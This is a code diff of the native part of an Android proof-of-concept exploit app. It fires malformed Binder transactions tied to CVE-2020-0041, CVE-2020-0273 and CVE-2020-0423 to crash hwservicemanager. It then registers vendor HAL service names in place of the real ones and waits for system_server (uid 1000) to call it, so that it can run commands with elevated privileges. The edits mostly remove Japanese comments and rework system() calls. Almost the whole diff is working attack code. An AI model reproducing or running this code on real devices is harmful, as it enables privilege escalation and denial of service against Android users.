@@ -204,7 +204,7 @@ static int exploit_cve_2019_2023(const char *service_name) {
 }
 
 // ============================================================
-// CVE-2020-0041: OOB書き込み（BINDER_WRITE_READで境界外アクセス）
+// CVE-2020-0041: OOB書き込み
 // ============================================================
 static int trigger_cve_2020_0041(void) {
     int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
@@ -213,7 +213,6 @@ static int trigger_cve_2020_0041(void) {
         return -1;
     }
 
-    // 異常に大きなoffsets_sizeを指定してOOB書き込みを誘発
     struct {
         uint32_t cmd;
         struct binder_transaction_data tdata;
@@ -223,7 +222,7 @@ static int trigger_cve_2020_0041(void) {
     tx.tdata.code = 0;
     tx.tdata.flags = 0;
     tx.tdata.data_size = 4096;
-    tx.tdata.offsets_size = 0xFFFFFFFF; // 異常な値
+    tx.tdata.offsets_size = 0xFFFFFFFF;
     tx.tdata.data.ptr.buffer = 0;
     tx.tdata.data.ptr.offsets = 0;
 
@@ -256,7 +255,7 @@ static int trigger_cve_2020_0273(void) {
 
     struct binder_node_info_for_ref info;
     memset(&info, 0, sizeof(info));
-    info.handle = 0xFFFFFFFF; // 無効なハンドル
+    info.handle = 0xFFFFFFFF;
 
     int ret = ioctl(hwbinder_fd, BINDER_GET_NODE_INFO_FOR_REF, &info);
     close(hwbinder_fd);
@@ -275,8 +274,6 @@ static int trigger_cve_2020_0423(void) {
     int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
     if (hwbinder_fd < 0) return -1;
 
-    // 複数スレッドで同時にBINDER_WRITE_READを呼び出し競合を誘発
-    // （実際の競合は困難なため、ここでは軽量な競合テストのみ）
     pid_t pid = fork();
     if (pid == 0) {
         for (int i = 0; i < 100; i++) {
@@ -439,7 +436,7 @@ static int crash_hwservicemanager(void) {
 }
 
 // ============================================================
-// Binderサーバーループ（トランザクション処理）
+// Binderサーバーループ
 // ============================================================
 static int binder_server_loop(int binder_fd, int expected_handle) {
     uint8_t read_buf[4096];
@@ -489,7 +486,6 @@ static int binder_server_loop(int binder_fd, int expected_handle) {
             log_transaction("Incoming transaction", t, data_ptr);
             if (data_ptr) free(data_ptr);
 
-            // system_server (uid=1000) からの呼び出しを検知
             if (t->sender_euid == 1000) {
                 LOGI("***** system_server CALLED OUR SERVICE! (uid=1000) *****");
                 pid_t pid = fork();
@@ -512,7 +508,6 @@ static int binder_server_loop(int binder_fd, int expected_handle) {
                 LOGI("Sender uid=%d (ignoring)", t->sender_euid);
             }
 
-            // 応答を返す
             struct {
                 uint32_t cmd;
                 uint32_t status;
@@ -645,7 +640,6 @@ Java_com_example_tzpoc_MainActivity_nativeExploit(JNIEnv* env, jclass clazz,
         LOGI("Log file created: %s", g_log_path);
     }
 
-    // hwservicemanager PID取得
     g_hwservicemanager_pid = get_hwservicemanager_pid();
     if (g_hwservicemanager_pid <= 0) {
         LOGI("Could not find hwservicemanager. Continuing anyway...");
@@ -653,7 +647,6 @@ Java_com_example_tzpoc_MainActivity_nativeExploit(JNIEnv* env, jclass clazz,
         LOGI("Current hwservicemanager PID: %d", g_hwservicemanager_pid);
     }
 
-    // フェーズ1: クラッシュ攻撃（最大5回試行）
     LOGI("Phase 1: Crash hwservicemanager with multiple vectors");
     int crashed = 0;
     for (int i = 0; i < 5 && !crashed; i++) {
@@ -666,7 +659,6 @@ Java_com_example_tzpoc_MainActivity_nativeExploit(JNIEnv* env, jclass clazz,
         LOGI("Failed to crash hwservicemanager. Continuing anyway...");
     }
 
-    // フェーズ2: 再起動待ち
     LOGI("Phase 2: Wait for hwservicemanager restart");
     int max_wait = 30;
     while (max_wait-- > 0) {
@@ -679,7 +671,6 @@ Java_com_example_tzpoc_MainActivity_nativeExploit(JNIEnv* env, jclass clazz,
         sleep(1);
     }
 
-    // フェーズ3: 全サービス再登録 & サーバー起動
     LOGI("Phase 3: Register all services and start servers");
     const char *target_services[] = {
         "vendor.qti.hardware.servicetracker@1.0::IServicetracker/default",
@@ -695,7 +686,6 @@ Java_com_example_tzpoc_MainActivity_nativeExploit(JNIEnv* env, jclass clazz,
         usleep(300000);
     }
 
-    // フェーズ4: 長時間待機（system_serverからの呼び出しを待つ）
     LOGI("Phase 4: Waiting for system_server to call...");
     LOGI("Running for 180 seconds. Check %s for logs.", g_log_path);
 
@@ -704,9 +694,12 @@ Java_com_example_tzpoc_MainActivity_nativeExploit(JNIEnv* env, jclass clazz,
         if (g_exploit_success) break;
     }
 
-    // 結果表示
-    LOGI("Log file content:");
-    system("cat " LOG_PATH " 2>/dev/null || echo 'No log file found'");
+    // 結果表示（ログファイルの内容を表示）
+    {
+        char cmd[512];
+        snprintf(cmd, sizeof(cmd), "cat %s 2>/dev/null || echo 'No log file found'", g_log_path);
+        system(cmd);
+    }
 
     if (g_exploit_success) {
         LOGI("Exploit succeeded! Check %s", g_output_path);
@@ -718,7 +711,9 @@ Java_com_example_tzpoc_MainActivity_nativeExploit(JNIEnv* env, jclass clazz,
             char cmd[512];
             snprintf(cmd, sizeof(cmd), "id > %s 2>&1", g_output_path);
             system(cmd);
-            system("cat " OUTPUT_PATH);
+            char cat_cmd[512];
+            snprintf(cat_cmd, sizeof(cat_cmd), "cat %s", g_output_path);
+            system(cat_cmd);
             g_exploit_success = 1;
             return 1;
         }
